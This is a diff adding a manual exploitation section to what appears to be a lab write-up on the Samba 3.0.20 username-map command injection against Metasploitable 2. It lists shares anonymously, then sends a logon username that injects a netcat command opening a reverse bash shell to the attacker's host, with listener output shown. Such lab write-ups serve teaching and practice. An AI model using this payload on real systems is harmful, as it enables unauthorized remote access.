@@ -28,6 +28,50 @@ It's worth noting in the below examples I am using [Metasploitable 2](https://me
 
 #### Manual Exploitation
 
+Exploiting this one manually has a few steps but it's not too tricky, it's not exactly efficient but it does the trick! Firstly we need to setup a listening on netcat, open a termninal and use `netcat -nvlp` the actual listener is defined with `l` so you might be wondering what all of this means? Well, `-n` tells Netcat not to resolve names, `-v` specifies to give us a verbose output when printing, `-l` specifies to create the listener as we mentioned and `-p` will create that listener on *any* local port.
+
+Once we have the listener setup we are now going to open a new terminal and check the victims shares, we can do this with `smbclient -L //192.168.139.133` where `-L` will get a list of shares available on a host. We're using Metasploitable 2 as mentioned.
+
+```
+root@LinxzSecKali:~# smbclient -L //192.168.139.133
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            METASPLOITABLE
+  
+```
+We're going to focus on the `tmp` folder & attempt to connect to the victim using `smbclient  //192.168.139.133/tmp` now you should receive the following back from the target.
+
+```
+root@LinxzSecKali:~# smbclient  //192.168.139.133/tmp
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+```
+
+Next, we need to setup the reverse shell, you should see a prompt that looks like this after the previous command `smb: \>` this is good news, next we need to send `logon` to the target with logon ```logon/=`nc 192.168.139.135 4444 -e /bin/bash``` this time make sure you use your machines ip & not the targets! If we switch back to our terminal we created the netcat listener in you should see this.
+
+```
+root@LinxzSecKali:~# netcat -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.139.135] from (UNKNOWN) [192.168.139.133] 36513
+```
+Now you can execute commands and see that we've owned the machine! As I mentioned, there's a few steps for us to carry out but it's all relatively simple stuff. If in doubt just use `--help` :p
+
 
 #### Metasploit Exploitation
 
